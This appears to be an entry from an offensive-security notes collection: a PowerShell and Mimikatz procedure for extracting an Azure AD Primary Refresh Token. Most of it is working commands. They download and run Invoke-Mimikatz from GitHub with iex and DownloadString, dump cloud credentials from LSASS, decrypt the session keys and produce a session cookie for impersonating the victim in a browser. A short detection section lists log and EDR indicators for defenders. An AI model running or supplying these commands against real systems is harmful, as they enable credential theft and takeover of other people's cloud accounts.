---
id: 4ab8caa8-3836-49e2-977b-37de1ae45a94
name: Invoke-Mimikatz-for-Azure-PRT-Extraction
type: code
language: powershell
verified: true
created_at: '2023-05-25T19:01:32.184573+00:00'
updated_at: '2023-05-25T19:01:32.229778+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - prt-extraction
  - azure-ad
validated: true
---

# Invoke-Mimikatz-for-Azure-PRT-Extraction

## Code

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug


# Display the PRT data and copy the PRT key and the ProofOfPosessionKey.KeyValue
Mimikatz> sekurlsa::cloudap

# Decrypt the session key (use the ProofOfPossesionKey keyvalue here); Copy the Context value and Derived key value
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Use the PRT Key, Context and Derived key copied earlier; Copy the Signature with key token "ey...", this is the PRT session cookie
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```

## Description

This PowerShell code downloads and invokes Mimikatz to extract Azure AD Primary Refresh Token (PRT) data from LSASS, including decryption of session keys and generation of a forgeable session cookie for browser impersonation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <KeyValue> | ProofOfPossessionKey value from sekurlsa::cloudap output | Base64-encoded key string |
| <Context> | Context value from decryption step | Base64-encoded context |
| <DerivedKey> | Derived key from decryption | Base64-encoded derived key |
| <PRT> | Primary Refresh Token from dump | Base64-encoded PRT |

## Usage

Execute in PowerShell on an AAD-joined Windows machine with admin privileges. Copy intermediate values (PRT, KeyValue, etc.) manually for substitution in later Mimikatz commands. The final output is a JWT token for cookie injection. Used in post-exploitation for Azure credential theft.

## Detection

- PowerShell downloads from GitHub (network logs for nishang URLs).
- Mimikatz process creation or LSASS access (Event ID 4688, Sysmon).
- Anomalous DPAPI decryption attempts in event logs.
- EDR alerts for sekurlsa::cloudap or privilege::debug modules.

## Related

- [[procedures/Azure-Pass-The-PRT-with-Mimikatz]]
- [[tools/Mimikatz]]
